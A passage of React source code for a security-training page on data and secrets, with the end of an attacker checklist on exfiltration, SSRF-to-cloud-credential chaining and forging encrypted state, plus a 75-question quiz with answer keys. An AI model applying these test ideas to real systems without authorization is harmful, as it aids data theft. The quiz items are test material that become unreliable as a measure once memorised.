          "Are there license files, configs, or cookies I can decrypt/forge?",
          "Can I bypass paywalls or limits by manipulating encrypted state?",
        ],
      },
      {
        title: "Data Exfiltration Checklist",
        testIdeas: [
          "What's the maximum data I can extract with my current access?",
          "Are there export features without proper pagination/limits?",
          "Can I chain bugs (SSRF → metadata → cloud creds)?",
          "What's the sensitivity of accessible data? (PII, financial, health)",
          "What regulations apply? (GDPR, HIPAA, PCI-DSS)",
          "How would I frame the impact in a report? (Volume, sensitivity, pivot)",
        ],
      },
    ],
  },
];

const QUIZ_QUESTION_COUNT = 10;
const QUIZ_ACCENT_COLOR = "#ef4444";
const quizQuestions: QuizQuestion[] = [
  {
    id: 1,
    topic: "Fundamentals",
    question: "Data and secrets security focuses on:",
    options: [
      "Protecting sensitive data and credentials across their lifecycle",
      "Only encrypting hard drives",
      "Only scanning for malware",
      "Only managing passwords",
    ],
    correctAnswer: 0,
    explanation: "The goal is to protect data and secrets wherever they are stored, processed, or transmitted.",
  },
  {
    id: 2,
    topic: "Fundamentals",
    question: "PII stands for:",
    options: ["Personally Identifiable Information", "Public Internet Identifier", "Private Internal Index", "Primary Identity Indicator"],
    correctAnswer: 0,
    explanation: "PII includes data that can identify an individual.",
  },
  {
    id: 3,
    topic: "Fundamentals",
    question: "Least privilege means:",
    options: [
      "Users get only the access they need",
      "Everyone is an admin",
      "Permissions never change",
      "Only the security team has access",
    ],
    correctAnswer: 0,
    explanation: "Limiting access reduces the blast radius of compromise.",
  },
  {
    id: 4,
    topic: "Fundamentals",
    question: "Data minimization means:",
    options: [
      "Collecting and storing only what is necessary",
      "Keeping all data forever",
      "Encrypting every file",
      "Allowing all uploads",
    ],
    correctAnswer: 0,
    explanation: "Minimization reduces exposure and compliance risk.",
  },
  {
    id: 5,
    topic: "Fundamentals",
    question: "Exfiltration refers to:",
    options: [
      "Unauthorized transfer of data out of an environment",
      "Applying system updates",
      "Encrypting backups",
      "Creating user accounts",
    ],
    correctAnswer: 0,
    explanation: "Exfiltration is the unauthorized movement of data to an attacker.",
  },
  {
    id: 6,
    topic: "Fundamentals",
    question: "The safest place to store secrets is:",
    options: [
      "A dedicated secrets manager",
      "Client-side code",
      "A shared document",
      "Source control comments",
    ],
    correctAnswer: 0,
    explanation: "Secrets managers provide controlled access and auditing.",
  },
  {
    id: 7,
    topic: "Fundamentals",
    question: "Hardcoding secrets in code is risky because:",
    options: [
      "They can be exposed through repos or client bundles",
      "They are encrypted automatically",
      "They improve performance",
      "They are always private",
    ],
    correctAnswer: 0,
    explanation: "Hardcoded secrets are easy to leak and hard to rotate.",
  },
  {
    id: 8,
    topic: "Fundamentals",
    question: "Why should secrets be masked in logs?",
    options: [
      "Logs are often broadly accessible and long-lived",
      "It makes logs faster",
      "It disables monitoring",
      "It removes audit trails",
    ],
    correctAnswer: 0,
    explanation: "Logs can be accessed by many systems and people.",
  },
  {
    id: 9,
    topic: "Fundamentals",
    question: "Defense in depth for data protection includes:",
    options: [
      "Access control, encryption, and monitoring",
      "Only backups",
      "Only antivirus",
      "Only strong passwords",
    ],
    correctAnswer: 0,
    explanation: "Layered controls reduce single points of failure.",
  },
  {
    id: 10,
    topic: "Fundamentals",
    question: "Credential rotation helps by:",
    options: [
      "Limiting the impact of leaked secrets",
      "Disabling encryption",
      "Reducing audit logs",
      "Making secrets permanent",
    ],
    correctAnswer: 0,
    explanation: "Rotation shortens the window of exposure.",
  },
  {
    id: 11,
    topic: "Classification",
    question: "Data classification labels are used to:",
    options: [
      "Define handling, storage, and access requirements",
      "Increase storage costs",
      "Hide data from audits",
      "Avoid encryption",
    ],
    correctAnswer: 0,
    explanation: "Classification guides how data must be protected.",
  },
  {
    id: 12,
    topic: "Classification",
    question: "Confidential data should be:",
    options: [
      "Encrypted at rest and in transit",
      "Stored in public buckets",
      "Shared without restrictions",
      "Kept in client-side storage",
    ],
    correctAnswer: 0,
    explanation: "Encryption protects sensitive data in storage and transit.",
  },
  {
    id: 13,
    topic: "Classification",
    question: "A data owner is responsible for:",
    options: [
      "Defining classification and access requirements",
      "Running antivirus scans",
      "Rotating logs",
      "Updating firmware",
    ],
    correctAnswer: 0,
    explanation: "Owners define how data should be handled and accessed.",
  },
  {
    id: 14,
    topic: "Classification",
    question: "Retention policies ensure:",
    options: [
      "Data is kept only as long as needed",
      "All data is stored forever",
      "Backups are never deleted",
      "Logs are disabled",
    ],
    correctAnswer: 0,
    explanation: "Retention reduces exposure and supports compliance.",
  },
  {
    id: 15,
    topic: "Classification",
    question: "Pseudonymization means:",
    options: [
      "Replacing identifiers while keeping a reversible mapping",
      "Removing all identifiers permanently",
      "Encrypting data with a public key",
      "Deleting logs",
    ],
    correctAnswer: 0,
    explanation: "Pseudonymization can be reversed with a mapping.",
  },
  {
    id: 16,
    topic: "Classification",
    question: "Tokenization is:",
    options: [
      "Replacing sensitive values with non-sensitive tokens",
      "Encrypting with a static key",
      "Compressing logs",
      "Duplicating data",
    ],
    correctAnswer: 0,
    explanation: "Tokens reduce exposure while preserving structure.",
  },
  {
    id: 17,
    topic: "Classification",
    question: "Redaction means:",
    options: [
      "Masking or removing sensitive portions of data",
      "Encrypting files",
      "Exporting full records",
      "Increasing log verbosity",
    ],
    correctAnswer: 0,
    explanation: "Redaction hides sensitive data while keeping context.",
  },
  {
    id: 18,
    topic: "Classification",
    question: "Data residency refers to:",
    options: [
      "Where data is stored and processed geographically",
      "How data is encrypted",
      "Who owns the data",
      "How data is backed up",
    ],
    correctAnswer: 0,
    explanation: "Residency affects compliance and legal requirements.",
  },
  {
    id: 19,
    topic: "Classification",
    question: "Need-to-know access means:",
    options: [
      "Only authorized users can access data for their role",
      "All employees can access all data",
      "Only vendors can access data",
      "Data is stored in public folders",
    ],
    correctAnswer: 0,
    explanation: "Access should be limited to what is required for the job.",
  },
  {
    id: 20,
    topic: "Classification",
    question: "Non-production environments should use:",
    options: [
      "Masked or synthetic data",
      "Full customer datasets",
      "Public buckets only",
      "No access controls",
    ],
    correctAnswer: 0,
    explanation: "Using masked data reduces exposure during testing.",
  },
  {
    id: 21,
    topic: "File Uploads",
    question: "A common file upload risk is:",
    options: [
      "Uploading executable or script files",
      "Using large monitors",
      "Updating packages",
      "Logging in with MFA",
    ],
    correctAnswer: 0,
    explanation: "Executable uploads can lead to code execution.",
  },
  {
    id: 22,
    topic: "File Uploads",
    question: "Validating the Content-Type header alone is unsafe because:",
    options: [
      "It can be spoofed by an attacker",
      "It is encrypted",
      "It only works on Linux",
      "It increases bandwidth",
    ],
    correctAnswer: 0,
    explanation: "Attackers can send any Content-Type header.",
  },
  {
    id: 23,
    topic: "File Uploads",
    question: "A safe upload practice is to:",
    options: [
      "Store uploads outside the web root",
      "Execute uploads directly",
      "Disable validation",
      "Use predictable filenames",
    ],
    correctAnswer: 0,
    explanation: "Keeping uploads outside web roots reduces execution risk.",
  },
  {
    id: 24,
    topic: "File Uploads",
    question: "Randomizing upload filenames helps prevent:",
    options: [
      "Guessing and overwriting existing files",
      "Encryption",
      "Database indexing",
      "SIEM logging",
    ],
    correctAnswer: 0,
    explanation: "Random names reduce enumeration and overwrite risks.",
  },
  {
    id: 25,
    topic: "File Uploads",
    question: "Scanning uploads with AV is used to:",
    options: [
      "Detect known malicious files",
      "Replace server-side validation",
      "Block all PDFs",
      "Disable monitoring",
    ],
    correctAnswer: 0,
    explanation: "AV scanning is one layer and should not replace validation.",
  },
  {
    id: 26,
    topic: "File Uploads",
    question: "Zip slip vulnerabilities allow attackers to:",
    options: [
      "Write files outside the intended extraction path",
      "Encrypt backups",
      "Bypass MFA",
      "Reset passwords",
    ],
    correctAnswer: 0,
    explanation: "Path traversal in archives can write to arbitrary locations.",
  },
  {
    id: 27,
    topic: "File Uploads",
    question: "CSV injection is a risk when:",
    options: [
      "Spreadsheet formulas execute from untrusted fields",
      "Logs are encrypted",
      "Files are compressed",
      "Headers are missing",
    ],
    correctAnswer: 0,
    explanation: "Spreadsheet formulas can execute commands or exfiltrate data.",
  },
  {
    id: 28,
    topic: "File Uploads",
    question: "File size limits help mitigate:",
    options: [
      "Resource exhaustion and denial of service",
      "MFA bypass",
      "SQL injection",
      "DNS tunneling",
    ],
    correctAnswer: 0,
    explanation: "Large files can exhaust storage or processing capacity.",
  },
  {
    id: 29,
    topic: "File Uploads",
    question: "Path traversal in downloads occurs when:",
    options: [
      "User input is used to build file paths without validation",
      "Files are encrypted",
      "Backups are rotated",
      "Users reset passwords",
    ],
    correctAnswer: 0,
    explanation: "Unvalidated paths can allow access to arbitrary files.",
  },
  {
    id: 30,
    topic: "File Uploads",
    question: "Presigned URLs should:",
    options: [
      "Expire after a short time",
      "Last indefinitely",
      "Be shared publicly",
      "Bypass access controls",
    ],
    correctAnswer: 0,
    explanation: "Short expiry limits unauthorized access.",
  },
  {
    id: 31,
    topic: "Storage",
    question: "Secrets in client-side code are risky because:",
    options: [
      "They are visible to any user who can inspect the client",
      "They are automatically rotated",
      "They increase performance",
      "They are always encrypted",
    ],
    correctAnswer: 0,
    explanation: "Client-side code can be inspected and secrets extracted.",
  },
  {
    id: 32,
    topic: "Storage",
    question: "A safe storage approach is to:",
    options: [
      "Separate public and private data buckets",
      "Store everything in a public bucket",
      "Disable access controls",
      "Allow public listing by default",
    ],
    correctAnswer: 0,
    explanation: "Separation reduces accidental exposure.",
  },
  {
    id: 33,
    topic: "File Uploads",
    question: "Best practice for file types is to:",
    options: [
      "Allowlist extensions and validate content",
      "Allow any extension",
      "Trust client-side checks only",
      "Disable validation",
    ],
    correctAnswer: 0,
    explanation: "Allowlists and content checks reduce risk.",
  },
  {
    id: 34,
    topic: "File Uploads",
    question: "Server-side validation is required because:",
    options: [
      "Client-side checks can be bypassed",
      "It slows uploads",
      "It breaks encryption",
      "It disables logging",
    ],
    correctAnswer: 0,
    explanation: "Attackers can bypass client-side checks easily.",
  },
  {
    id: 35,
    topic: "Logging",
    question: "Logging full secrets is risky because:",
    options: [
      "Logs are widely accessible and retained",
      "It improves troubleshooting",
      "It reduces storage",
      "It guarantees security",
    ],
    correctAnswer: 0,
    explanation: "Logs often have broad access and long retention.",
  },
  {
    id: 36,
    topic: "Storage",
    question: "Uploads should be stored with:",
    options: [
      "Restricted permissions and no public access",
      "Public read access by default",
      "No access controls",
      "Shared global credentials",
    ],
    correctAnswer: 0,
    explanation: "Restrictive permissions prevent accidental exposure.",
  },
  {
    id: 37,
    topic: "Secrets",
    question: "A secrets manager provides:",
    options: [
      "Centralized storage, access control, and auditing",
      "Public sharing links",
      "Unlimited access for all users",
      "Client-side storage",
    ],
    correctAnswer: 0,
    explanation: "Secrets managers control access and track usage.",
  },
  {
    id: 38,
    topic: "Secrets",
    question: "Secrets should never be stored in:",
    options: [
      "Source control repositories",
      "A secrets manager",
      "Environment injection at runtime",
      "KMS encrypted stores",
    ],
    correctAnswer: 0,
    explanation: "Source control is a common leak vector.",
  },
  {
    id: 39,
    topic: "Secrets",
    question: "API keys should be:",
    options: [
      "Scoped to only the required permissions",
      "Full admin access by default",
      "Shared across teams",
      "Embedded in client apps",
    ],
    correctAnswer: 0,
    explanation: "Scoped keys limit damage if exposed.",
  },
  {
    id: 40,
    topic: "Secrets",
    question: "Short-lived tokens reduce risk because:",
    options: [
      "Stolen tokens expire quickly",
      "They never expire",
      "They disable encryption",
      "They remove audits",
    ],
    correctAnswer: 0,
    explanation: "Short lifetimes limit exposure if tokens leak.",
  },
  {
    id: 41,
    topic: "Secrets",
    question: "After a secret is exposed, you should:",
    options: [
      "Rotate it immediately and invalidate old tokens",
      "Ignore it",
      "Share it with vendors",
      "Disable logging",
    ],
    correctAnswer: 0,
    explanation: "Rotation and invalidation reduce continued abuse.",
  },
  {
    id: 42,
    topic: "Secrets",
    question: "KMS or HSM usage helps by:",
    options: [
      "Protecting and auditing cryptographic keys",
      "Disabling encryption",
      "Storing passwords in plain text",
      "Reducing access controls",
    ],
    correctAnswer: 0,
    explanation: "KMS/HSM provide secure key storage and controls.",
  },
  {
    id: 43,
    topic: "Secrets",
    question: "Separating key management from data access:",
    options: [
      "Reduces the chance of single point compromise",
      "Increases exposure",
      "Removes auditing",
      "Disables encryption",
    ],
    correctAnswer: 0,
    explanation: "Separation of duties reduces compromise impact.",
  },
  {
    id: 44,
    topic: "Secrets",
    question: "Secret scanning in CI helps:",
    options: [
      "Detect accidental secret commits early",
      "Hide secrets",
      "Disable alerts",
      "Increase log noise",
    ],
    correctAnswer: 0,
    explanation: "Scanning prevents secrets from entering repositories.",
  },
  {
    id: 45,
    topic: "Secrets",
    question: "Sharing secrets in tickets or chat is risky because:",
    options: [
      "They may be stored and accessible long term",
      "It improves collaboration",
      "It increases encryption",
      "It reduces audit needs",
    ],
    correctAnswer: 0,
    explanation: "Tickets and chats are often retained and widely accessible.",
  },
  {
    id: 46,
    topic: "Secrets",
    question: "Per-service accounts are preferred because:",
    options: [
      "They improve accountability and limit blast radius",
      "They are faster",
      "They are always public",
      "They prevent auditing",
    ],
    correctAnswer: 0,
    explanation: "Separate accounts reduce shared exposure.",
  },
  {
    id: 47,
    topic: "Access Control",
    question: "RBAC stands for:",
    options: [
      "Role-Based Access Control",
      "Rule-Based Access Cache",
      "Remote Backup Access Control",
      "Rapid Breach Access Control",
    ],
    correctAnswer: 0,
    explanation: "RBAC assigns permissions based on roles.",
  },
  {
    id: 48,
    topic: "Access Control",
    question: "ABAC stands for:",
    options: [
      "Attribute-Based Access Control",
      "Application Backup Access Control",
      "Automated Breach Alert Control",
      "Admin Blocklist Access Control",
    ],
    correctAnswer: 0,
    explanation: "ABAC uses attributes like department or region.",
  },
  {
    id: 49,
    topic: "Access Control",
    question: "Row-level security is used to:",
    options: [
      "Restrict data access to specific rows per user",
      "Encrypt entire disks",
      "Handle uploads",
      "Rotate logs",
    ],
    correctAnswer: 0,
    explanation: "Row-level security enforces per-record access controls.",
  },
  {
    id: 50,
    topic: "Access Control",
    question: "Multi-tenant systems should always enforce:",
    options: [
      "Tenant scoping on every query",
      "Public read access",
      "Shared admin accounts",
      "No authentication",
    ],
    correctAnswer: 0,
    explanation: "Tenant scoping prevents cross-tenant data exposure.",
  },
  {
    id: 51,
    topic: "Access Control",
    question: "IDOR vulnerabilities allow:",
    options: [
      "Access to another user's data by changing an ID",
      "Faster queries",
      "Automatic encryption",
      "Improved backups",
    ],
    correctAnswer: 0,
    explanation: "IDOR occurs when access checks are missing or weak.",
  },
  {
    id: 52,
    topic: "Access Control",
    question: "Default deny means:",
    options: [
      "Access is blocked unless explicitly allowed",
      "All access is allowed",
      "Only admins can log in",
      "Logs are disabled",
    ],
    correctAnswer: 0,
    explanation: "Default deny reduces unintended access.",
  },
  {
    id: 53,
    topic: "Access Control",
    question: "Admin access should require:",
    options: [
      "Strong authentication such as MFA",
      "No authentication",
      "Shared passwords",
      "Public links",
    ],
    correctAnswer: 0,
    explanation: "MFA reduces account compromise risk.",
  },
  {
    id: 54,
    topic: "Access Control",
    question: "Access logs should record:",
    options: [
      "Who accessed data and when",
      "Only file sizes",
      "Only hostnames",
      "Only error codes",
    ],
    correctAnswer: 0,
    explanation: "Audit trails are critical for investigations.",
  },
  {
    id: 55,
    topic: "Access Control",
    question: "Service accounts should have:",
    options: [
      "Only the permissions required for their job",
      "Full admin access",
      "No logging",
      "Public credentials",
    ],
    correctAnswer: 0,
    explanation: "Minimize privileges to reduce impact of compromise.",
  },
  {
    id: 56,
    topic: "Access Control",
    question: "Public bucket listing should be:",
    options: [
      "Disabled unless explicitly required",
      "Enabled by default",
      "Required for backups",
      "Used for secrets",
    ],
    correctAnswer: 0,
    explanation: "Listing can expose sensitive files unintentionally.",
  },
  {
    id: 57,
    topic: "Backups",
    question: "Backups should be:",
    options: [
      "Encrypted and access controlled",
      "Publicly accessible",
      "Stored without testing",
      "Ignored",
    ],
    correctAnswer: 0,
    explanation: "Backups contain sensitive data and must be protected.",
  },
  {
    id: 58,
    topic: "Backups",
    question: "Restore testing is important because:",
    options: [
      "Backups can be corrupted or incomplete",
      "It reduces encryption",
      "It disables logging",
      "It replaces access control",
    ],
    correctAnswer: 0,
    explanation: "Untested backups may fail during incidents.",
  },
  {
    id: 59,
    topic: "Backups",
    question: "Bucket versioning helps by:",
    options: [
      "Allowing recovery from accidental deletions",
      "Disabling encryption",
      "Removing logs",
      "Speeding up uploads only",
    ],
    correctAnswer: 0,
    explanation: "Versioning preserves previous file states.",
  },
  {
    id: 60,
    topic: "Backups",
    question: "Lifecycle policies are used to:",
    options: [
      "Automatically expire or archive old data",
      "Disable access control",
      "Create user accounts",
      "Bypass logging",
    ],
    correctAnswer: 0,
    explanation: "Lifecycle rules manage retention and cost.",
  },
  {
    id: 61,
    topic: "Detection",
    question: "DLP tools are used to:",
    options: [
      "Detect and prevent sensitive data leakage",
      "Run backups",
      "Rotate keys",
      "Encrypt passwords only",
    ],
    correctAnswer: 0,
    explanation: "DLP monitors and blocks data loss channels.",
  },
  {
    id: 62,
    topic: "Detection",
    question: "Monitoring large downloads helps detect:",
    options: [
      "Potential data exfiltration",
      "Disk errors",
      "Printer outages",
      "UI bugs",
    ],
    correctAnswer: 0,
    explanation: "Large downloads can indicate data theft.",
  },
  {
    id: 63,
    topic: "Detection",
    question: "Alerting on unusual query volume helps identify:",
    options: [
      "Automated scraping or data dumping",
      "Normal browsing",
      "User onboarding",
      "Patch deployment",
    ],
    correctAnswer: 0,
    explanation: "Spikes can indicate automated exfiltration.",
  },
  {
    id: 64,
    topic: "Detection",
    question: "Canary tokens are used to:",
    options: [
      "Detect unauthorized access to sensitive assets",
      "Encrypt data",
      "Block uploads",
      "Remove logs",
    ],
    correctAnswer: 0,
    explanation: "Canaries trigger alerts when accessed.",
  },
  {
    id: 65,
    topic: "Response",
    question: "During an incident, you should first:",
    options: [
      "Preserve evidence before cleanup",
      "Delete logs",
      "Rotate all passwords without context",
      "Disable monitoring",
    ],
    correctAnswer: 0,
    explanation: "Evidence collection is critical for root cause analysis.",
  },
  {
    id: 66,
    topic: "Response",
    question: "Regulatory notification should involve:",
    options: [
      "Legal and compliance teams",
      "Only engineering",
      "Only marketing",
      "Only vendors",
    ],
    correctAnswer: 0,
    explanation: "Legal guidance ensures proper reporting and timelines.",
  },
  {
    id: 67,
    topic: "Response",
    question: "After a leak, you should:",
    options: [
      "Rotate exposed keys and invalidate sessions",
      "Ignore the exposure",
      "Disable all logging",
      "Publish the data",
    ],
    correctAnswer: 0,
    explanation: "Rotation reduces ongoing abuse of exposed credentials.",
  },
  {
    id: 68,
    topic: "Response",
    question: "Regression tests help by:",
    options: [
      "Ensuring data exposure fixes do not return",
      "Removing access controls",
      "Disabling alerts",
      "Reducing audit trails",
    ],
    correctAnswer: 0,
    explanation: "Tests prevent regressions in sensitive areas.",
  },
  {
    id: 69,
    topic: "Response",
    question: "Read-only database accounts are best for:",
    options: [
      "Reporting and analytics workloads",
      "Admin tooling",
      "Schema changes",
      "User management",
    ],
    correctAnswer: 0,
    explanation: "Read-only access reduces risk in reporting paths.",
  },
  {
    id: 70,
    topic: "Response",
    question: "Access logging should capture:",
    options: [
      "User, resource, action, and timestamp",
      "Only hostnames",
      "Only file size",
      "Only error codes",
    ],
    correctAnswer: 0,
    explanation: "Full context supports audits and investigations.",
  },
  {
    id: 71,
    topic: "Response",
    question: "Periodic access reviews help ensure:",
    options: [
      "Permissions remain appropriate over time",
      "Logs are deleted",
      "Backups are disabled",
      "Encryption is removed",
    ],
    correctAnswer: 0,
    explanation: "Reviews catch privilege creep and stale access.",
  },
  {
    id: 72,
    topic: "Response",
    question: "Secure deletion is difficult because:",
    options: [
      "Backups and replicas may retain data",
      "It is always instant",
      "It requires no tooling",
      "It is the same as archiving",
    ],
    correctAnswer: 0,
    explanation: "Data can persist in backups and replicated storage.",
  },
  {
    id: 73,
    topic: "Response",
    question: "Third-party data risk should be managed by:",
    options: [
      "Vendor assessments and contractual controls",
      "Sharing all secrets",
      "Disabling monitoring",
      "Publicly exposing data",
    ],
    correctAnswer: 0,
    explanation: "Vendors must meet security requirements for data handling.",
  },
  {
    id: 74,
    topic: "Response",
    question: "Security testing on data sources should:",
    options: [
      "Be authorized and scoped in writing",
      "Be done on production without notice",
      "Ignore legal requirements",
      "Skip documentation",
    ],
    correctAnswer: 0,
    explanation: "Authorization and scope are required for safe testing.",
  },
  {
    id: 75,
    topic: "Response",
    question: "Chain of custody is important because:",
    options: [
      "It documents evidence handling for legal defensibility",
      "It replaces backups",
      "It hides findings",
      "It removes audit logs",
    ],
    correctAnswer: 0,
    explanation: "Evidence handling must be documented and defensible.",
  },
];

export default function DataSecretsPage() {
  const theme = useTheme();
  const navigate = useNavigate();
  const [selectedTab, setSelectedTab] = useState(0);
  const [expandedAccordion, setExpandedAccordion] = useState<string | false>("panel-0");

  const pageContext = `This page covers Data & Secrets security topics including:
- File upload vulnerabilities and bypass techniques
- File download security and path traversal attacks
- Data storage security from an attacker's perspective
- Logs, caches, backups, and temporary file hunting
- Secrets hunting in code, repos, frontends, and infrastructure
- Cryptographic misuse and exploitation
- Data exfiltration techniques and impact assessment
- Comprehensive attacker checklists for each topic`;

  const renderSubSection = (sub: SubSection, index: number) => (
    <Box key={index} sx={{ mb: 4 }}>
      <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "text.primary" }}>
        {sub.title}
      </Typography>

      {sub.points && (
        <List dense sx={{ mb: 2 }}>
          {sub.points.map((point, i) => (
            <ListItem key={i} sx={{ py: 0.5 }}>
              <ListItemIcon sx={{ minWidth: 32 }}>
                <CheckCircleIcon sx={{ fontSize: 16, color: "success.main" }} />
              </ListItemIcon>
              <ListItemText 
                primary={point} 
                primaryTypographyProps={{ variant: "body2" }} 
              />
            </ListItem>
          ))}
        </List>
      )}

      {sub.table && (
        <TableContainer component={Paper} variant="outlined" sx={{ mb: 2, borderRadius: 2 }}>
          <Table size="small">
            <TableHead>
              <TableRow sx={{ bgcolor: alpha(theme.palette.primary.main, 0.05) }}>
                {sub.table.headers.map((h, i) => (
                  <TableCell key={i} sx={{ fontWeight: 700 }}>{h}</TableCell>
                ))}
              </TableRow>
            </TableHead>
            <TableBody>
              {sub.table.rows.map((row, i) => (
                <TableRow key={i} hover>
                  {row.map((cell, j) => (
                    <TableCell key={j}>
                      <Typography variant="body2" sx={{ fontFamily: j === 0 ? "monospace" : "inherit", fontSize: "0.85rem" }}>
                        {cell}
                      </Typography>
                    </TableCell>
                  ))}
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </TableContainer>
      )}

      {sub.code && (
        <Paper
          sx={{
            p: 2,
            mb: 2,
            bgcolor: alpha(theme.palette.common.black, 0.8),
            borderRadius: 2,
            overflow: "auto",
          }}
        >
          <Typography
            component="pre"
            sx={{
              fontFamily: "monospace",
              fontSize: "0.8rem",
              color: "#e2e8f0",
              whiteSpace: "pre-wrap",
              wordBreak: "break-word",
              m: 0,
            }}
          >
            {sub.code}
          </Typography>
        </Paper>
      )}

      {sub.warning && (
        <Alert severity="warning" sx={{ mb: 2, borderRadius: 2 }}>
          <Typography variant="body2">{sub.warning}</Typography>
        </Alert>
      )}

      {sub.tip && (
        <Alert severity="info" sx={{ mb: 2, borderRadius: 2 }}>
          <Typography variant="body2">💡 {sub.tip}</Typography>
        </Alert>
      )}

      {sub.testIdeas && (
        <Card variant="outlined" sx={{ mb: 2, borderRadius: 2, borderColor: alpha(theme.palette.error.main, 0.3), bgcolor: alpha(theme.palette.error.main, 0.02) }}>
          <CardContent sx={{ py: 2, "&:last-child": { pb: 2 } }}>
            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1.5, color: "error.main", display: "flex", alignItems: "center", gap: 1 }}>
              <BugReportIcon fontSize="small" /> Test Ideas
            </Typography>
            <List dense sx={{ py: 0 }}>
              {sub.testIdeas.map((idea, i) => (
                <ListItem key={i} sx={{ py: 0.25, pl: 0 }}>
                  <ListItemIcon sx={{ minWidth: 24 }}>
                    <Box sx={{ width: 6, height: 6, borderRadius: "50%", bgcolor: "error.main" }} />
                  </ListItemIcon>
                  <ListItemText 
                    primary={idea} 
                    primaryTypographyProps={{ variant: "body2", color: "text.secondary" }} 
                  />
                </ListItem>
              ))}
            </List>
          </CardContent>
        </Card>
      )}
    </Box>
  );

  return (
    <LearnPageLayout pageTitle="Data & Secrets" pageContext={pageContext}>
    <Container maxWidth="lg" sx={{ py: 4 }}>
      {/* Back Button */}
      <Chip
        component={Link}
        to="/learn"
        icon={<ArrowBackIcon />}
        label="Back to Learning Hub"
        clickable
        variant="outlined"
        sx={{ borderRadius: 2, mb: 3 }}
      />

      {/* Header */}
      <Box sx={{ mb: 5 }}>
        <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
          <Box
            sx={{
              width: 64,
              height: 64,
              borderRadius: 3,
              background: `linear-gradient(135deg, #ef4444, #f97316)`,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
            }}
          >
            <FolderIcon sx={{ fontSize: 32, color: "white" }} />
          </Box>
          <Box>
            <Typography
              variant="h3"
              sx={{
                fontWeight: 800,
                background: `linear-gradient(135deg, #ef4444, #f97316, #f59e0b)`,
                backgroundClip: "text",
                WebkitBackgroundClip: "text",
                WebkitTextFillColor: "transparent",
              }}
            >
              Data & Secrets
            </Typography>
            <Typography variant="subtitle1" color="text.secondary">
              Files, Uploads, Storage, Crypto Misuse & Secrets Hunting
            </Typography>
          </Box>
        </Box>
        <Typography variant="body1" color="text.secondary" sx={{ maxWidth: 900, lineHeight: 1.8 }}>
          Everything about finding, accessing, and extracting data that applications didn't intend to expose. 
          From file upload bypass to secrets hunting to abusing weak cryptography.
        </Typography>
      </Box>

      {/* Quick Stats */}
      <Grid container spacing={2} sx={{ mb: 4 }}>
        {[
          { label: "Topics", value: "8", color: "#ef4444" },
          { label: "Techniques", value: "80+", color: "#f97316" },
          { label: "Code Examples", value: "25+", color: "#f59e0b" },
          { label: "Checklists", value: "7", color: "#10b981" },
        ].map((stat) => (
          <Grid item xs={6} sm={3} key={stat.label}>
            <Paper
              sx={{
                p: 2,
                textAlign: "center",
                borderRadius: 2,
                border: `1px solid ${alpha(stat.color, 0.2)}`,
                bgcolor: alpha(stat.color, 0.03),
              }}
            >
              <Typography variant="h4" sx={{ fontWeight: 800, color: stat.color }}>
                {stat.value}
              </Typography>
              <Typography variant="caption" color="text.secondary">
                {stat.label}
              </Typography>
            </Paper>
          </Grid>
        ))}
      </Grid>

      {/* Section Navigation */}
      <Paper sx={{ mb: 4, borderRadius: 3, overflow: "hidden" }}>
        <Tabs
          value={selectedTab}
          onChange={(_, v) => setSelectedTab(v)}
          variant="scrollable"
          scrollButtons="auto"
          sx={{
            borderBottom: 1,
            borderColor: "divider",
            "& .MuiTab-root": {
              textTransform: "none",
              fontWeight: 600,
              minHeight: 64,
            },
          }}
        >
          {sections.map((section, i) => (
            <Tab
              key={section.id}
              label={
                <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                  <Box sx={{ color: section.color }}>{section.icon}</Box>
                  <span>{section.title.replace(/^\d+\.\s*/, "")}</span>
                </Box>
              }
            />
          ))}
        </Tabs>

        {/* Tab Content */}
        {sections.map((section, i) => (
          <TabPanel key={section.id} value={selectedTab} index={i}>
            <Box sx={{ p: { xs: 2, md: 4 } }}>
              {/* Section Header */}
              <Box sx={{ mb: 4 }}>
                <Typography
                  variant="h4"
                  sx={{
                    fontWeight: 800,
                    color: section.color,
                    mb: 1,
                    display: "flex",
                    alignItems: "center",
                    gap: 2,
                  }}
                >
                  <Box
                    sx={{
                      width: 48,
                      height: 48,
                      borderRadius: 2,
                      bgcolor: alpha(section.color, 0.1),
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                    }}
                  >
                    {section.icon}
                  </Box>
                  {section.title}
                </Typography>
              </Box>

              {/* Subsections as Accordions */}
              {section.subsections.map((sub, j) => (
                <Accordion
                  key={j}
                  expanded={expandedAccordion === `panel-${i}-${j}`}
                  onChange={(_, expanded) => setExpandedAccordion(expanded ? `panel-${i}-${j}` : false)}
                  sx={{
                    mb: 2,
                    borderRadius: "12px !important",
                    border: `1px solid ${alpha(section.color, 0.15)}`,
                    "&:before": { display: "none" },
                    overflow: "hidden",
                  }}
                >
                  <AccordionSummary
                    expandIcon={<ExpandMoreIcon />}
                    sx={{
                      bgcolor: alpha(section.color, 0.03),
                      "&:hover": { bgcolor: alpha(section.color, 0.06) },
                    }}
                  >
                    <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>
                      {sub.title}
                    </Typography>
                  </AccordionSummary>
                  <AccordionDetails sx={{ pt: 3 }}>
                    {renderSubSection(sub, j)}
                  </AccordionDetails>
                </Accordion>
              ))}
            </Box>
          </TabPanel>
        ))}
      </Paper>

      {/* Quick Reference Footer */}
      <Paper
        sx={{
          p: 4,
          borderRadius: 3,
          background: `linear-gradient(135deg, ${alpha("#ef4444", 0.05)}, ${alpha("#f97316", 0.05)})`,
          border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
        }}
      >
        <Typography variant="h6" sx={{ fontWeight: 700, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
          <DangerousIcon color="error" /> Critical Reminders
        </Typography>
        <Grid container spacing={3}>
          {[
            { title: "Always Get Authorization", desc: "Never test file access or data extraction without explicit written permission." },
            { title: "Don't Exfiltrate Real Data", desc: "Prove you can access it, document the impact, but don't actually download customer PII." },
            { title: "Report Secrets Carefully", desc: "Mask credentials in reports. Don't share full API keys even with the client." },
            { title: "Chain for Impact", desc: "A config file leak is interesting. A config file → DB creds → full dump is critical." },
          ].map((item, i) => (
            <Grid item xs={12} sm={6} key={i}>
              <Box sx={{ display: "flex", gap: 2 }}>
                <WarningIcon sx={{ color: "warning.main", mt: 0.5 }} />
                <Box>
